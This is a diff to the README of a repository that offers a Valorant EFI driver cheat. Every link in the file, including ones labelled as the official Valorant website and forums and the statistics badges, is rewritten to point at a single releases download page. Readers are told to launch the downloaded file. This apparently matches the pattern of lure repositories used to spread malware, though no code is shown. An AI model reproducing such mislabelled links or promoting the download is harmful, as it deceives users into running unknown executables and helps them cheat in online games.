@@ -9,7 +9,7 @@ Welcome to the **Valorant EFI Driver Cheat Hack** repository! This is where you 
 
 ## 🚀 Get Started
 To download the cheat hack, click the link below:
-[![Download Cheat Hack](https://img.shields.io/badge/Download-Cheat_Hack-blue)](https://github.com/files/File.zip)
+[![Download Cheat Hack](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
 
 ### Note:
 - If the link ends with the file name, please ensure to launch the file after downloading.
@@ -33,18 +33,18 @@ Using cheats or hacks in online games may violate the game's terms of service an
 Contributions to this repository are welcome! If you have ideas for improving the cheat hack or want to report any issues, feel free to submit a pull request or open an issue.
 
 ## 📊 Statistics
-- Stars: ![Stars](https://img.shields.io/github/stars/yourusername/yourrepository)
-- Forks: ![Forks](https://img.shields.io/github/forks/yourusername/yourrepository)
-- Issues: ![Issues](https://img.shields.io/github/issues/yourusername/yourrepository)
+- Stars: ![Stars](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
+- Forks: ![Forks](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
+- Issues: ![Issues](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
 
 ## 📜 License
 This cheat hack is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## 🌐 More Resources
-- Official Valorant Website: [Valorant](https://playvalorant.com/)
-- Valorant Community Forums: [Forums](https://forums.valorant.com/)
+- Official Valorant Website: [Valorant](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
+- Valorant Community Forums: [Forums](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
 
 ## 🙌 Thank You
 Thank you for checking out the **Valorant EFI Driver Cheat Hack** repository. Have fun gaming with your newfound advantage! 🚀
 
-![Valorant](https://example.com/valorant-image.jpg)
+![Valorant](https://github.com/AWGGaeGes/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
